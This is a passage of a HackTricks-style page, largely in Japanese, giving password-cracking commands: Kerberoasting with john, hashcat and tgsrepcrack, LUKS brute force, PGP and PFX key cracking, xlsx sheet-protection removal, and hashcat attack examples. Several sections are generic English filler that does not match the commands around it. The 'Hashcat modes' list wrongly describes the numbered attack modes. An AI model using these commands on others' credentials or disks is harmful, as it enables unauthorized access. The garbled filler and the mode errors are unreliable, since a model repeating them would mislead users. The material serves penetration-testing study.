Keberoastingは、Active Directory（AD）環境で使用されるサービスアカウントのパスワードをクラックするための攻撃手法です。この攻撃は、Kerberos認証プロトコルの脆弱性を利用しています。

攻撃者は、AD環境内のサービスアカウントのユーザー名を特定し、そのユーザー名を使用してKerberosチケットを要求します。次に、攻撃者は取得したチケットをオフラインで解析し、サービスアカウントのパスワードをクラックします。

Keberoastingは、攻撃者がサービスアカウントのパスワードをクラックするために、弱いパスワードハッシュを持つサービスアカウントを特定することに依存しています。攻撃者は、特定のサービスアカウントがパスワードハッシュを保持していることを確認するために、Active Directory内のサービスプリンシパル名（SPN）を調査します。

Keberoasting攻撃は、パスワードポリシーの強化やサービスアカウントのパスワードの定期的な変更などの対策が不十分な場合に成功する可能性があります。したがって、セキュリティ上のリスクを軽減するためには、強力なパスワードポリシーの実施とサービスアカウントの適切な管理が重要です。
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### ラックスイメージ

#### 方法1

インストール: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### メソッド2

Brute force is a common method used in hacking to gain unauthorized access to a system or account. It involves systematically trying all possible combinations of passwords until the correct one is found. This method is effective when the password is weak or easily guessable. However, it can be time-consuming and resource-intensive.

To perform a brute force attack, hackers use automated tools that generate and test a large number of password combinations. These tools can be customized to target specific systems or accounts, increasing the chances of success. Brute force attacks can be carried out on various protocols, such as HTTP, FTP, SSH, and others.

To protect against brute force attacks, it is important to use strong and unique passwords that are not easily guessable. Additionally, implementing account lockout policies can help prevent multiple login attempts within a short period of time. Monitoring and analyzing login attempts can also help detect and mitigate brute force attacks.

Remember, brute force attacks are illegal and unethical unless performed with proper authorization for legitimate purposes such as penetration testing. Always obtain proper authorization before attempting any hacking techniques.
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
別のLuks BFチュートリアル：[http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### PGP/GPGの秘密鍵

Brute forcing a PGP/GPG private key is an extremely difficult task due to the large key space. The private key is typically protected by a passphrase, which adds an additional layer of security. However, if the passphrase is weak or easily guessable, it may be possible to brute force the key.

To brute force a PGP/GPG private key, you would need to generate all possible key combinations and test each one until the correct passphrase is found. This process can be time-consuming and resource-intensive, especially for longer and more complex passphrases.

There are several tools available that can assist in brute forcing PGP/GPG private keys, such as `pgcrack` and `gpg2john`. These tools automate the process of generating key combinations and testing them against the private key.

It is important to note that brute forcing a PGP/GPG private key is generally considered unethical and illegal without proper authorization. It is recommended to only use these techniques for legitimate purposes, such as recovering a forgotten passphrase or testing the strength of your own private key.
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### Cisco

<figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### DPAPI Master Key

[https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py)を使用して、次にjohnを使用します。

### Open Office Pwd Protected Column

パスワードで保護された列を持つxlsxファイルがある場合、次の手順で保護を解除できます：

* **Googleドライブにアップロード**し、パスワードは自動的に削除されます
* 手動で**削除**するには：
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### PFX証明書

PFX証明書は、公開鍵暗号方式で使用されるデジタル証明書の一種です。PFXは、個人情報交換ファイル（Personal Information Exchange）の略称です。PFX証明書は、秘密鍵と公開鍵のペアを含み、一般的にはパスワードで保護されています。

PFX証明書は、デジタル署名や暗号化などのセキュリティ関連の操作に使用されます。PFX証明書を使用すると、データの機密性や整合性を確保することができます。

PFX証明書を作成するには、秘密鍵と公開鍵のペアを生成し、それらをPFXフォーマットにエクスポートする必要があります。PFX証明書は、一般的にはパスワードで保護されているため、安全なパスワードの選択と管理が重要です。

PFX証明書は、WebサーバーのSSL/TLS証明書や電子メールの署名証明書など、さまざまな用途で使用されます。PFX証明書の管理と保護は、セキュリティの重要な側面です。
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.io/)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**し、自動化します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## ツール

**ハッシュの例：** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### ハッシュ識別子
```bash
hash-identifier
> <HASH>
```
### ワードリスト

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **ワードリスト生成ツール**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** 設定可能なベース文字、キーマップ、ルートを持つ高度なキーボードウォークジェネレーター。
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### Johnの変異

_**/etc/john/john.conf**_を読み、それを設定します。
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Hashcatの攻撃方法

* **ワードリスト攻撃** (`-a 0`) とルール

**Hashcat**にはすでに**ルールが含まれたフォルダ**がありますが、[**ここで他の興味深いルールを見つけることができます**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules)。
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* **ワードリスト組み合わせ**攻撃

hashcatを使用して、2つのワードリストを1つに組み合わせることができます。\
もし、リスト1には単語**"hello"**が含まれ、2つ目のリストには単語**"world"**と**"earth"**がそれぞれ2行ずつ含まれていた場合、`helloworld`と`helloearth`という単語が生成されます。
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **マスク攻撃** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* ワードリスト + マスク (`-a 6`) / マスク + ワードリスト (`-a 7`) 攻撃
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### Hashcatのモード

Hashcatは、さまざまなハッシュアルゴリズムをクラックするためのさまざまなモードを提供しています。以下にいくつかの一般的なモードを示します。

- **ハッシュモード**（モード0）：ハッシュ値を解読するための基本的なモードです。ハッシュアルゴリズムに応じて、ハッシュ値を解読するためのルールや攻撃方法を指定することができます。

- **ワードリストモード**（モード1）：事前に作成されたワードリストを使用して、ハッシュ値を解読するモードです。ワードリストには、一般的なパスワードや辞書ワードが含まれています。

- **組み合わせモード**（モード2）：複数のワードリストを組み合わせて使用し、ハッシュ値を解読するモードです。これにより、複数のワードリストを組み合わせて攻撃することができます。

- **ルールベースモード**（モード3）：ルールを使用して、ワードリストの単語を変形させ、ハッシュ値を解読するモードです。ルールには、文字の追加、置換、削除などの変換方法が含まれています。

- **ハイブリッドモード**（モード4）：ワードリストとルールを組み合わせて使用し、ハッシュ値を解読するモードです。ワードリストとルールの組み合わせにより、より効率的な攻撃が可能となります。

これらのモードは、Hashcatの柔軟性とパフォーマンスを最大限に活用するための重要なツールです。ハッシュクラッキングの目的や環境に応じて、適切なモードを選択することが重要です。
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
# Linuxハッシュのクラック - /etc/shadowファイル

## 概要

Linuxシステムでは、ユーザーのパスワードは/etc/shadowファイルにハッシュ化されて保存されます。このファイルは通常、rootユーザーのみがアクセスできるようになっています。しかし、ハッシュ関数の性質上、ハッシュ値から元のパスワードを復元することは不可能ではありません。このため、ハッシュを解読することで、ユーザーのパスワードを取得することができます。

## ブルートフォース攻撃

ブルートフォース攻撃は、ハッシュ値を解読するための一般的な手法です。この攻撃では、可能なすべてのパスワードの組み合わせを試し、ハッシュ値と一致するものを見つけることを目指します。

以下は、ブルートフォース攻撃の手順です。

1. ハッシュ値を取得します。/etc/shadowファイルからユーザーのハッシュ値を抽出します。
2. パスワードリストを作成します。攻撃者は、一般的なパスワードや辞書攻撃に使用するためのパスワードリストを作成します。
3. パスワードリストを使用して攻撃を開始します。攻撃者は、パスワードリスト内の各パスワードをハッシュ化し、ハッシュ値と一致するかどうかを確認します。
4. 一致するパスワードが見つかるまで繰り返します。攻撃者は、すべてのパスワードを試すまで繰り返します。

## ツールとリソース

ブルートフォース攻撃を実行するためには、以下のツールとリソースが必要です。

- パスワードリスト: ブルートフォース攻撃に使用するパスワードのリストです。一般的なパスワードや辞書攻撃に使用されることがあります。
- ハッシュクラッキングツール: ハッシュ値を解読するためのツールです。John the RipperやHashcatなどが一般的に使用されます。

## 対策方法

ユーザーのパスワードを保護するためには、以下の対策を実施することが重要です。

- 強力なパスワードポリシーの設定: ユーザーには、複雑なパスワードを使用するように要求するポリシーを設定します。
- パスワードのハッシュ化: パスワードはハッシュ関数を使用して保存されるべきです。また、ソルトを使用してハッシュ値をより安全にすることも重要です。
- パスワードリストの使用禁止: システム上で一般的なパスワードリストの使用を禁止します。
- ログイン試行回数の制限: ログイン試行回数を制限することで、ブルートフォース攻撃を防ぐことができます。

以上がLinuxハッシュのクラックに関する情報です。ユーザーのパスワードを保護するためには、適切な対策を実施することが重要です。
```
500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
# Windowsハッシュのクラック

## 概要

Windowsオペレーティングシステムでは、ユーザーのパスワードはハッシュ値として保存されます。このハッシュ値を解読することで、パスワードを特定することができます。このセクションでは、Windowsハッシュのクラックについて説明します。

## ツールとリソース

Windowsハッシュをクラックするために使用できるさまざまなツールとリソースがあります。以下はいくつかの一般的なものです。

- **John the Ripper**: パスワードクラッキングツールで、Windowsハッシュの解読に使用できます。
- **Hashcat**: 高速なパスワードリカバリツールで、Windowsハッシュのクラックに使用できます。
- **RainbowCrack**: レインボーテーブルを使用して、Windowsハッシュを解読するための効率的なツールです。
- **Online Hash Crack**: オンラインサービスで、Windowsハッシュのクラックを行うことができます。

## ブルートフォース攻撃

ブルートフォース攻撃は、すべての可能な組み合わせを試すことでパスワードを解読する手法です。Windowsハッシュのクラックにおいても、ブルートフォース攻撃は有効な手法の一つです。

以下は、ブルートフォース攻撃を使用してWindowsハッシュをクラックする手順です。

1. パスワードリストの作成: ブルートフォース攻撃に使用するパスワードのリストを作成します。一般的なパスワードや辞書攻撃に使用される単語を含めることができます。

2. ツールの設定: 使用するツール（例：John the Ripper、Hashcat）を設定します。ハッシュの種類や攻撃方法などを指定します。

3. 攻撃の実行: ツールを使用してブルートフォース攻撃を実行します。ツールはパスワードリストの各項目を試し、ハッシュと一致するパスワードを見つけるまで続けます。

4. パスワードの特定: ツールが一致するパスワードを見つけた場合、それがWindowsハッシュのパスワードとなります。

## 注意事項

Windowsハッシュのクラックは合法的な目的でのみ使用してください。また、クラックするパスワードは自分のものであるか、明示的な許可を得たものに限定してください。不正なアクセスやプライバシー侵害は法的な問題となります。

## まとめ

Windowsハッシュのクラックは、ユーザーのパスワードを解読するための重要な手法です。ブルートフォース攻撃や専用のツールを使用することで、Windowsハッシュのクラックを行うことができます。ただし、合法的な目的で使用し、適切な許可を得ることが重要です。
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
# Brute Force

Brute force is a common method used to crack application hashes. It involves systematically trying every possible combination of characters until the correct password is found.

## Dictionary Attack

A dictionary attack is a type of brute force attack that uses a pre-defined list of commonly used passwords, known as a dictionary, to crack hashes. This method is effective because many users choose weak passwords that are easily guessable.

## Hybrid Attack

A hybrid attack combines elements of both brute force and dictionary attacks. It involves using a combination of dictionary words and additional characters or numbers to crack hashes. This method is useful for cracking passwords that are not in the dictionary but still follow a predictable pattern.

## Mask Attack

A mask attack is a type of brute force attack that uses a predefined pattern, or mask, to generate passwords. The mask specifies which characters are fixed and which can vary. This method is useful when the password follows a specific format, such as having a certain number of letters followed by a certain number of digits.

## Rainbow Tables

Rainbow tables are precomputed tables of hashes and their corresponding plaintext passwords. They can be used to quickly look up the plaintext password for a given hash, bypassing the need for brute force or dictionary attacks. However, rainbow tables can be large and require a significant amount of storage space.

## GPU Acceleration

Graphics Processing Units (GPUs) can be used to accelerate the brute force cracking process. GPUs are highly parallel processors that can perform many calculations simultaneously, making them well-suited for password cracking. Tools like hashcat and John the Ripper support GPU acceleration.

## Conclusion

Brute force attacks, including dictionary attacks, hybrid attacks, and mask attacks, are commonly used to crack application hashes. Rainbow tables and GPU acceleration can also be used to speed up the cracking process. It is important to use strong, unique passwords to protect against these types of attacks.
```
900 | MD4                                              | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
1400 | SHA-256                                          | Raw Hash
1700 | SHA-512                                          | Raw Hash
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.io/)を使用して、世界で最も**高度なコミュニティツール**によって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
